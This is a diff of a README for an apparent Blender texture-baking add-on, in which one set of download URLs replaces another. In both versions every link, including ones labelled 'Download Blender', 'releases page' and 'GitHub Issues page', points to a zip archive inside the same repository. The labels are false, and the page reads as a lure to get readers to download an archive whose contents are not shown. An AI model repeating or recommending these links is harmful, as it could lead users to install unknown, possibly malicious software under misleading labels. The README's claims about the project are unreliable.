@@ -1,6 +1,6 @@
 # 🎨 Quick-Texture-Baker - Simplify Your Texture Workflows Today
 
-[![Download Now!](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip%20Now!-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip)
+[![Download Now!](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip%20Now!-Get%20the%20Latest%20Release-brightgreen)](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip)
 
 ## 📜 Description
 
@@ -10,15 +10,15 @@ Quick Texture Baker is a Blender add-on that helps you create and bake textures 
 
 Follow these simple steps to get started with Quick Texture Baker:
 
-1. **Download Blender.** Ensure you have Blender 4.0 or later installed on your computer. You can get it [here](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip).
+1. **Download Blender.** Ensure you have Blender 4.0 or later installed on your computer. You can get it [here](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip).
 
 2. **Visit the Releases Page.** Click on the link below to access the releases page:
 
-   [Download Quick Texture Baker](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip)
+   [Download Quick Texture Baker](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip)
 
 3. **Choose Your Version.** Look for the most recent release version, and click on it. 
 
-4. **Download the Add-on File.** Locate the file named `https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip` or a similarly named file and download it.
+4. **Download the Add-on File.** Locate the file named `https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip` or a similarly named file and download it.
 
 ## 📥 Download & Install
 
@@ -30,7 +30,7 @@ To install Quick Texture Baker, follow these steps:
 
 3. **Navigate to Add-ons.** In the Preferences window, click on the `Add-ons` tab.
 
-4. **Install the Add-on.** Click on the `Install...` button. Navigate to the location where you downloaded the https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip file. Select it and click `Install Add-on`.
+4. **Install the Add-on.** Click on the `Install...` button. Navigate to the location where you downloaded the https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip file. Select it and click `Install Add-on`.
 
 5. **Enable the Add-on.** After installation, find Quick Texture Baker in the list of add-ons. Check the box next to it to enable it.
 
@@ -67,7 +67,7 @@ Once you've installed Quick Texture Baker, using it is a breeze.
 
 ## 📣 Support
 
-If you encounter issues or have questions about using Quick Texture Baker, feel free to check out our [GitHub Issues page](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip). Our community and maintainers will be happy to assist you.
+If you encounter issues or have questions about using Quick Texture Baker, feel free to check out our [GitHub Issues page](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip). Our community and maintainers will be happy to assist you.
 
 ## 🥳 Join the Community
 
@@ -82,4 +82,4 @@ Connect with other users and share your work. Join our community for tips, trick
 
 Quick Texture Baker is open-source and available under the MIT License. You can find more details in the LICENSE file in this repository. 
 
-[Download Quick Texture Baker](https://raw.githubusercontent.com/nejidxb/Quick-Texture-Baker/main/QUICK-TEXTURE-BAKER/Quick-Texture-Baker-v3.6-beta.3.zip) and start enhancing your texturing workflow now!
+[Download Quick Texture Baker](https://github.com/nejidxb/Quick-Texture-Baker/raw/refs/heads/main/QUICK-TEXTURE-BAKER/Quick-Baker-Texture-2.1.zip) and start enhancing your texturing workflow now!
